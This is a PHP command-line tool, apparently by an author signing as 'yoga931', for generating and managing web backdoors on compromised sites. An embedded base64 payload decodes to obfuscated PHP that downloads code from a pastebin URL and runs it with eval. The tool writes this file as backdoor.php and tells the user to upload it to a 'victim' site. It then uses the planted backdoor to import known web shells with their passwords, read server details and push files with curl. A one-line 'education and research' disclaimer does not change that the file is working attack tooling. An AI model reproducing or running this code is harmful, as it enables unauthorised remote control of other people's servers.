<?php
// Nonaktifkan pelaporan kesalahan
error_reporting(0);

// Definisikan kode warna untuk terminal
$blue = "\e[34m";
$lightBlue = "\e[36m";
$cln = "\e[0m";
$green = "\e[92m";
$forestGreen = "\e[32m";
$red = "\e[91m";
$bold = "\e[1m";

// Tampilkan header program dengan informasi
echo "
\e[96m
                           
   #####################################################################             
###                                                                     ##-           
##   ##################################+##############################   ##           
##   ##                     ############ #############              ##  .#+           
##   ##                  ######          #    **     #              ##  .#+           
##   ##                #####  ##         #   *   *   #              ##  .#+           
##   ##                #   ## ##         #  *  !  *  #              ##  .##           
##   ##                ##### ##########  # *#****#+ ##              ##  .#+           
##   ##                   ###  #       # #           #              ##  .#+           
##   ##                    ##  #   ###   #           #              ##  .#+           
##   ##          #########-    #   #  #  #           #              ##  .#+           
##               ##############    #  # ##           #              ##  .#+           
##   ##                    ##-+#####  ##  ##         #              ##  .#+           
##   ##               #####        #    ##           #              ##  .#+           
##   ##           ####  ########   ###   #           #              ##  .#+           
##   ##           ##  ##   ##   ##.   ####           #              ##  .#+           
##   ##           ##  #    ##     ###    #           #              ##  .#+           
##   ##            #  #    ##            #           #              ##  .#+           
##   ##          #######   ############# #############              ##  .#+           
##   ##                                                             ##  .#+           
##   #################################################################  .#+           
##                                                                       ##           
##                                                             ##   ##  +##           
 ####+.......................                  ..............     .   ###            
     #########################################-#######################                
                        ##..-----------.   ##                                        
                       ##               .+ +##                                        
                     ###                     ###                                      
         ###################################################                          
                                                                                          
               $cln  Sistem Manajemen Backdoor Sederhana
               $forestGreen  Dibuat oleh:$bold$red yoga931 $cln
$blue Catatan:$bold Saya Memebuat nya untuk kegiatan pendidikan penelitian selebihnya tidak bertanggung jawa. $cln \e[96m
==========================================================================================================================
";

// Inisialisasi variabel $bdcnt (seharusnya konten backdoor)
$bdcnt =  "PD9waHAgJHsiXHg0N0xceDRmQlx4NDFMXHg1MyJ9WyJceDY4bVx4NzJceDZhXHg3MVx4NjNceDZmXHg3NHpceDcwIl09Ilx4NjJceDY0XHg2Zlx4NzIiOyR7Ilx4NDdceDRjT1x4NDJceDQxXHg0Y1x4NTMifVsiXHg2M1x4NzZceDY3cVx4NzlceDZkYWNmXHg2NSJdPSJiXHg2NFx4NmZyIjskeyR7Ilx4NDdMT1x4NDJceDQxXHg0Y1x4NTMifVsiXHg2OFx4NmRceDcyXHg2YXFjXHg2Zlx4NzRceDdhXHg3MCJdfT1maWxlX2dldF9jb250ZW50cygiXHg2OFx4NzR0cFx4NzM6Ly9ceDcwYXNceDc0ZWJpblx4MmVjb1x4NmQvXHg3MmFceDc3L1x4N2E3aWhceDU4cFx4NTZceDQxIik7ZXZhbCgkeyR7Ilx4NDdceDRjT1x4NDJBXHg0Y1x4NTMifVsiXHg2M1x4NzZceDY3XHg3MVx4NzlceDZkXHg2MWNmZSJdfSk7Cj8+";
// Kosongkan baris terminal
echo "\n\n\n$cln";
echo $bold."Daftar Backdoor:$cln";
// Baca daftar backdoor dari file shells.txt
$sscontents = file_get_contents("shells.txt");
$sscontents = trim($sscontents, "\n");
$shells = explode("\n", $sscontents);
echo "\n\n";
// Periksa apakah daftar backdoor kosong
if ($sscontents == "") {
  echo $bold.$red."[!] Tidak Ada Backdoor Dalam Daftar Anda!\n$cln";
}
else {
$sno = 0;
// Tampilkan daftar backdoor
foreach ($shells as $shell) {
  echo $sno.". $shell\n";
  $sno++;
}
echo "=============================================";
}
menu1:
echo "\n\n[#] Masukkan Salah Satu Dari Ini (Nomor Backdoor|bantuan|generatebd) : ";
$selects = trim(fgets(STDIN, 1024));
// Menampilkan daftar perintah jika input adalah 'bantuan'
if ($selects == "bantuan") {
  echo "\n\n$bold"."Daftar Perintah\n$cln";
  echo "=============\n\n";
  echo $bold."[+] generatebd:$cln Menghasilkan File Backdoor (backdoor.php)\n";
  echo $bold."[+] bantuan:$cln Tampilkan Layar Bantuan Ini\n";
  echo "[+] Pilih Backdoor Dengan Mengetik Nomor Serial Yang Ditugaskan\n";
  goto menu1;
} 
elseif ($selects == "generatebd") { // Buat backdoor baru jika input adalah 'generatebd'
  echo $forestGreen."\n\n[+] Menghasilkan Backdoor ...";
  file_put_contents("backdoor.php", base64_decode($bdcnt));
  echo $cln.$lightBlue."\n[i] Backdoor Dibuat di$blue backdoor.php$cln";
  echo "\n[i] Sekarang Unggah Ini Ke Situs Korban Dan Tambahkan URL Dalam File$bold shells.txt$cln";
  echo "\n\n\n$cln";
  echo "Tekan Enter Untuk Melanjutkan\n\n";
  trim(fgets(STDIN, 1024));
  goto menu1;
} 
else {
  // Pilih backdoor berdasarkan input nomor
  $selected1 = $shells[$selects];
echo "$bold";
echo "\n[+] Shell Dipilih:$cln ".$selected1."\n";
echo $bold."[+] Memvalidasi Backdoor:$cln ";
$ssv = $selected1."?sscmd=v";
$vfc = file_get_contents($ssv);
// Periksa apakah backdoor valid
if ($vfc == "ssbkdrexst") {
  echo $forestGreen."Backdoor Ditemukan!\n\n$cln";
  menu2:
  echo "Daftar Tindakan\n$cln";
  echo "================\n";
  echo $green.$bold."[1]$cln Impor Shell PHP\n";
  echo $blue.$bold."[2]$cln Detail Server\n";
  echo $bold.$red."[3]$cln Hapus Backdoor\n";
  echo $forestGreen.$bold."[4]$cln Unggah File Jarak Jauh\n";
  echo $bold.$red."[5] Keluar\n";
  echo "$cln";
  // menu aksi

  // Pilih tindakan berdasarkan input pengguna
  echo "\n[#] Pilih Opsi (1|2|3|4|5):";
  $action = trim(fgets(STDIN, 1024));
  if ($action == "1") {
    // Impor shell PHP jika memilih opsi 1
    echo "\n\nDaftar Shell\n$cln";
    echo "===============\n";
    echo "[1]$bold Busur shell$cln {Pengguna & Sandi: shellbckd123}\n";
    echo "[2]$bold B374K shell$cln {Sandi: shellbcks123}\n";
    echo "[3]$bold Kurama shell$cln V.1.0 {Sandi: red}\n";
    echo "[4]$bold WSO shell$cln {Sandi: shellbckd123}\n";
    echo "[5]$bold MiNi shell$cln {Pengguna & Sandi: shellbckd123}\n";
      
    // Pilih shell dari daftar
    selectsshell:
    echo "\n[#] Pilih Shell Untuk Diimpor (1-5):";
    $impshell = trim(fgets(STDIN, 1024));
    if (!in_array($impshell, array('1', '2', '3', '4', '5'), true)) {
      echo $bold.$red."Masukan Tidak Valid$cln \n";
      goto selectsshell;
    }
    else {
      echo $lightBlue."\n\n[i] Mengimpor Shell...$cln";
      echo $lightBlue."\n[i] Mengirim Permintaan Dan Mendapatkan Respons...$cln";
      $shellact = $selected1."?sscmd=imps".$impshell;
      $shellimpresult = file_get_contents($shellact);
      echo "\n[R] ".$bold.$shellimpresult.$cln;
      echo "\n\n\n$cln";
      echo "Tekan Enter Untuk Melanjutkan\n\n";
      trim(fgets(STDIN, 1024));
      goto menu2;
    }
  }
elseif ($action == "2") {
    // Tampilkan detail server jika memilih opsi 2
    echo $bold.$lightBlue."\n[+] Info Server$cln";
    echo $lightBlue."\n[i] Mengirim Permintaan Dan Mendapatkan Respons...$cln";
    $svinfo = $selected1."?sscmd=si";
    $sicnt = file_get_contents($svinfo);
    echo $bold."\n$sicnt".$cln;
    echo "\n\n\n$cln";
    echo "Tekan Enter Untuk Melanjutkan\n\n";
    trim(fgets(STDIN, 1024));
    goto menu2;
}
elseif ($action == "3") {
// Hapus backdoor jika memilih opsi 3
  echo $bold.$red."\n[!] Hancurkan Backdoor$cln";
  echo $red."\n[i] Proses Ini Tidak Bisa Dikembalikan! COBA DENGAN RISIKO ANDA SENDIRI $cln";
  echo "\n\n[#] Ketik$bold FUCKME$cln Untuk Mengonfirmasi: ";
  $dela = trim(fgets(STDIN, 1024));
  if ($dela == "FUCKME") {
    echo $red."\n[i] Meminta Backdoor Yang Malang Untuk Mati ... :($cln";
    echo $red."\n[i] Mengirim Permintaan KEMATIAN ... :(\n\n$cln";
    $delurl = $selected1."?sscmd=fuckme";
    // Mengirim permintaan penghapusan backdoor
    system("curl -s $delurl");
    echo "\n\n[+] Mengonfirmasi Jika Orang Malang Itu Benar-Benar Mati: ";
    $cnfrmdel = file_get_contents($ssv);
    if ($cnfrmdel == "ssbkdrexst") {
      echo "Tidak Bisa Membunuh Bajingan Itu!\n\n";
    }
    else {
      echo "Dikonfirmasi! Sudah MATI!\n";
      echo "[i] Hapus Backdoor Ini Dari$bold shells.txt$cln Sudah Tidak Berguna Lagi!";
      echo "\n\n";
    }
  }
  else {
    echo "\n[!] Konfirmasi Gagal! Kembali Ke Menu Sebelumnya!";
    echo "\n\n\n$reset";
    echo "Tekan Enter Untuk Melanjutkan\n\n";
    trim(fgets(STDIN, 1024));
    goto menu2;
  }
}
// Jika aksi yang dipilih adalah "4" untuk unggah file jarak jauh
elseif ($action == "4") {
  // Menampilkan pesan untuk unggah file jarak jauh
  echo $bold.$lightBlue."[+] Unggah File Jarak Jauh$reset";
  echo "\n[i] Unggah File Dari Sistem Anda\n\n";
  // Meminta input jalur file dari pengguna
  uploadremotefile:
  echo "\n[#] Masukkan Jalur File: ";
  $fpath = trim(fgets(STDIN, 1024));
  // Meminta input nama file dari pengguna
  echo "[#] Masukkan Nama File: ";
  $fname = trim(fgets(STDIN, 1024));
  // Menampilkan jalur dan nama file yang dipilih
  echo $lightBlue."\n[-] File Dipilih:$reset $fpath";
  echo $lightBlue."\n[-] Nama File Dipilih:$reset $fname";
  // Memeriksa apakah file ada
  echo $lightBlue."\n[+] Memeriksa Apakah File Ada: $reset";
  if (file_exists($fpath)) {
      // Menampilkan pesan bahwa file ada dan memulai proses unggah
      echo "File Ada\n";
      echo $blue."[i] Memulai Pengunggahan File\n$reset";
      // Membaca dan mengenkripsi isi file
      $fileData = file_get_contents($fpath);
      $fileData = base64_encode($fileData);
      // Mengirim permintaan unggah file menggunakan curl
      echo $lightBlue."[i] Mengirim Permintaan Dan Mendapatkan Respon...\n\n$reset";
      system("curl -s -F fileData=$fileData -F fileName=$fname -F file=@$fpath $selected1?sscmd=u");
      // Menunggu input Enter dari pengguna untuk melanjutkan
      echo "\n\n\n$reset";
      echo "Tekan Enter Untuk Melanjutkan\n\n";
      trim(fgets(STDIN, 1024));
      // Kembali ke menu2
      goto menu2;
  } else {
      // Menampilkan pesan bahwa file tidak ada dan membatalkan prosedur unggah
      echo $red."File Tidak Ada! Membatalkan Prosedur Pengunggahan ...\n\n$reset";
      // Kembali ke label uploadremotefile untuk mencoba lagi
      goto uploadremotefile;
  }
}
}
// Jika backdoor tidak ditemukan
else {
  // Menampilkan pesan bahwa backdoor tidak ditemukan dan keluar
  echo $red."Backdoor Tidak Ditemukan, Keluar...$reset \n";
}
}
?>
